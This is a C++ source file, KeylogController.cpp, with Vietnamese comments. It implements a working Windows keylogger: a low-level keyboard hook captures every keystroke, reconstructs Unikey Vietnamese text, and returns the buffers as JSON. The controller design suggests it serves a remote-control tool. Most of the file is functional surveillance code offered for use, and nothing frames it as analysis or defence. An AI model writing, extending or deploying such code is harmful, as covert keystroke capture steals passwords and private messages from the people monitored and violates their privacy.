// controllers/KeylogController.cpp
// FIX FINAL 5.0:
// - RAW LOG: Fix triet de spam [SHIFT], [CTRL] bang cach so sanh ma phim (lastPhysicalCode).
// - DISPLAY LOG: Dong bo voi Unikey bang cach chap nhan MOI lenh Backspace (ke ca Injected).

#include "KeylogController.h"
#include <windows.h>
#include <mutex>
#include <atomic>
#include <thread>
#include <string>
#include <vector>
#include <sstream>
#include <iomanip>

using namespace std;

// --- STATE ---
static string bufferRaw = "";
static string bufferDisplay = "";
static mutex logMutex;
static atomic<bool> keylogEnabled(false);
static HHOOK hKeyboardHook = NULL;

// Bien chong spam cho Raw Log (Luu ma phim vat ly vua nhan)
static DWORD lastPhysicalCode = 0;

// --- HELPER: JSON ESCAPE (Tranh loi font Unicode) ---
string localJsonEscape(const string &s)
{
    ostringstream o;
    for (char c : s)
    {
        switch (c)
        {
        case '"':
            o << "\\\"";
            break;
        case '\\':
            o << "\\\\";
            break;
        case '\b':
            o << "\\b";
            break;
        case '\f':
            o << "\\f";
            break;
        case '\n':
            o << "\\n";
            break;
        case '\r':
            o << "\\r";
            break;
        case '\t':
            o << "\\t";
            break;
        default:
            if ((unsigned char)c < 0x20)
            {
                o << "\\u" << hex << setw(4) << setfill('0') << (int)((unsigned char)c);
            }
            else
            {
                o << c;
            }
        }
    }
    return o.str();
}

// Helper: Them ky tu Unicode vao chuoi UTF-8
void appendUtf8(string &s, wchar_t wc)
{
    if (wc < 0x80)
        s += (char)wc;
    else if (wc < 0x800)
    {
        s += (char)(0xC0 | (wc >> 6));
        s += (char)(0x80 | (wc & 0x3F));
    }
    else
    {
        s += (char)(0xE0 | (wc >> 12));
        s += (char)(0x80 | ((wc >> 6) & 0x3F));
        s += (char)(0x80 | (wc & 0x3F));
    }
}

// Helper: Xoa 1 ky tu UTF-8 (Xu ly Backspace)
void backspaceUtf8(string &s)
{
    if (s.empty())
        return;
    while (!s.empty())
    {
        char c = s.back();
        s.pop_back();
        // Dung khi gap byte dau tien cua ky tu (0xxxxxxx hoac 11xxxxxx)
        if ((c & 0xC0) != 0x80)
            break;
    }
}

// Helper: Lay ten phim day du cho Raw Log
string getFullRawKeyName(DWORD vkCode, bool shift, bool caps)
{
    // 1. Phim chuc nang
    switch (vkCode)
    {
    case VK_BACK:
        return "[BS]";
    case VK_TAB:
        return "[TAB]";
    case VK_RETURN:
        return "\n[ENTER]\n";
    case VK_SPACE:
        return " ";
    case VK_ESCAPE:
        return "[ESC]";
    case VK_CAPITAL:
        return "[CAPS]";
    case VK_LSHIFT:
    case VK_RSHIFT:
    case VK_SHIFT:
        return "[SHIFT]";
    case VK_LCONTROL:
    case VK_RCONTROL:
    case VK_CONTROL:
        return "[CTRL]";
    case VK_LMENU:
    case VK_RMENU:
    case VK_MENU:
        return "[ALT]";
    case VK_LWIN:
    case VK_RWIN:
        return "[WIN]";
    case VK_DELETE:
        return "[DEL]";
    case VK_SNAPSHOT:
        return "[PRTSC]";
    case VK_LEFT:
        return "[LEFT]";
    case VK_UP:
        return "[UP]";
    case VK_RIGHT:
        return "[RIGHT]";
    case VK_DOWN:
        return "[DOWN]";
    }

    // F1-F12
    if (vkCode >= VK_F1 && vkCode <= VK_F12)
        return "[F" + to_string(vkCode - VK_F1 + 1) + "]";

    // 2. Chu cai (A-Z)
    if (vkCode >= 'A' && vkCode <= 'Z')
    {
        bool isUpper = shift ^ caps;
        char c = isUpper ? (char)vkCode : (char)(vkCode + 32);
        return string(1, c);
    }

    // 3. So (0-9)
    if (vkCode >= '0' && vkCode <= '9')
    {
        if (!shift)
            return string(1, (char)vkCode);
        string syms = ")!@#$%^&*(";
        if (vkCode - '0' < syms.length())
            return string(1, syms[vkCode - '0']);
    }

    // 4. NumPad & Dau cau
    if (vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9)
        return string(1, (char)('0' + (vkCode - VK_NUMPAD0)));
    if (vkCode == VK_OEM_PERIOD)
        return shift ? ">" : ".";
    if (vkCode == VK_OEM_COMMA)
        return shift ? "<" : ",";
    if (vkCode == VK_OEM_MINUS)
        return shift ? "_" : "-";
    if (vkCode == VK_OEM_PLUS)
        return shift ? "+" : "=";
    if (vkCode == VK_OEM_1)
        return shift ? ":" : ";";
    if (vkCode == VK_OEM_2)
        return shift ? "?" : "/";
    if (vkCode == VK_OEM_3)
        return shift ? "~" : "`";
    if (vkCode == VK_OEM_4)
        return shift ? "{" : "[";
    if (vkCode == VK_OEM_5)
        return shift ? "|" : "\\";
    if (vkCode == VK_OEM_6)
        return shift ? "}" : "]";
    if (vkCode == VK_OEM_7)
        return shift ? "\"" : "'";

    return "";
}

// Helper: Lay ky tu hien thi cho Display Log (Chi lay van ban)
char getDisplayChar(DWORD vkCode, bool shift, bool caps)
{
    if (vkCode >= 'A' && vkCode <= 'Z')
    {
        return (shift ^ caps) ? (char)vkCode : (char)(vkCode + 32);
    }
    if (vkCode >= '0' && vkCode <= '9')
    {
        if (!shift)
            return (char)vkCode;
        string syms = ")!@#$%^&*(";
        if (vkCode - '0' < syms.length())
            return syms[vkCode - '0'];
    }
    if (vkCode == VK_OEM_PERIOD)
        return shift ? '>' : '.';
    if (vkCode == VK_OEM_COMMA)
        return shift ? '<' : ',';
    if (vkCode == VK_OEM_MINUS)
        return shift ? '_' : '-';
    if (vkCode == VK_OEM_PLUS)
        return shift ? '+' : '=';
    if (vkCode == VK_OEM_1)
        return shift ? ':' : ';';
    if (vkCode == VK_OEM_2)
        return shift ? '?' : '/';
    if (vkCode == VK_OEM_3)
        return shift ? '~' : '`';
    if (vkCode == VK_OEM_4)
        return shift ? '{' : '[';
    if (vkCode == VK_OEM_5)
        return shift ? '|' : '\\';
    if (vkCode == VK_OEM_6)
        return shift ? '}' : ']';
    if (vkCode == VK_OEM_7)
        return shift ? '"' : '\'';
    return 0;
}

// --- HOOK CALLBACK ---
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && keylogEnabled.load())
    {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
        bool isInjected = (p->flags & LLKHF_INJECTED) != 0; // Phim do Unikey sinh ra

        // XU LY KHI NHA PHIM (KEY UP) - De reset chong spam
        if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
        {
            if (p->vkCode == lastPhysicalCode)
            {
                lastPhysicalCode = 0; // Reset de cho phep phim do duoc nhan lai
            }
        }

        // XU LY KHI NHAN PHIM (KEY DOWN)
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
            bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

            lock_guard<mutex> lock(logMutex);

            // =================================================================
            // 1. RAW LOG: Chi ghi phim vat ly & Chong spam
            // =================================================================
            if (!isInjected)
            {
                bool isModifier = (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT || p->vkCode == VK_SHIFT ||
                                   p->vkCode == VK_LCONTROL || p->vkCode == VK_RCONTROL || p->vkCode == VK_CONTROL ||
                                   p->vkCode == VK_LMENU || p->vkCode == VK_RMENU || p->vkCode == VK_MENU ||
                                   p->vkCode == VK_LWIN || p->vkCode == VK_RWIN || p->vkCode == VK_CAPITAL);

                // Neu la phim chuc nang va dang bi giu (ma trung voi ma cuoi cung) -> Bo qua
                if (isModifier && p->vkCode == lastPhysicalCode)
                {
                    // Ignore spam
                }
                else
                {
                    bufferRaw += getFullRawKeyName(p->vkCode, shift, caps);
                    lastPhysicalCode = p->vkCode; // Cap nhat phim vua nhan
                }
            }

            // =================================================================
            // 2. DISPLAY LOG: Chap nhan tat ca de dong bo voi Unikey
            // =================================================================

            if (p->vkCode == VK_BACK)
            {
                // QUAN TRONG: Luon thuc hien xoa khi gap Backspace (ke ca la Injected)
                // Day la cach Unikey xoa ky tu sai de dien ky tu dung
                backspaceUtf8(bufferDisplay);
            }
            else if (p->vkCode == VK_RETURN)
            {
                bufferDisplay += "\n";
            }
            else if (p->vkCode == VK_SPACE)
            {
                bufferDisplay += " ";
            }
            else if (p->vkCode == VK_PACKET)
            {
                // Ky tu Unicode (Tieng Viet) do Unikey gui vao
                appendUtf8(bufferDisplay, (wchar_t)p->scanCode);
            }
            else if (!isInjected)
            {
                // Cac phim ky tu thong thuong (A-Z, 0-9...) - Chi lay phim vat ly
                // (Vi Unikey thuong dung VK_PACKET hoac Injected Backspace, khong Injected ky tu thuong)
                char c = getDisplayChar(p->vkCode, shift, caps);
                if (c != 0)
                    bufferDisplay += c;
            }
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

// --- THREAD LOOP ---
static void KeyLoggerThreadFunc()
{
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    if (hKeyboardHook)
        UnhookWindowsHookEx(hKeyboardHook);
}

// --- PUBLIC HANDLERS ---

void KeylogController::startKeyLoggerThread()
{
    thread(KeyLoggerThreadFunc).detach();
}

string KeylogController::getKeylog()
{
    lock_guard<mutex> lock(logMutex);

    string json = "{";
    json += "\"raw\":\"" + localJsonEscape(bufferRaw) + "\",";
    json += "\"display\":\"" + localJsonEscape(bufferDisplay) + "\",";
    json += "\"enabled\":" + string(keylogEnabled.load() ? "true" : "false");
    json += "}";

    bufferRaw = "";
    bufferDisplay = "";

    return json;
}

void KeylogController::setKeylog(bool enabled)
{
    keylogEnabled.store(enabled);
    if (enabled)
    {
        lastPhysicalCode = 0;
    }
}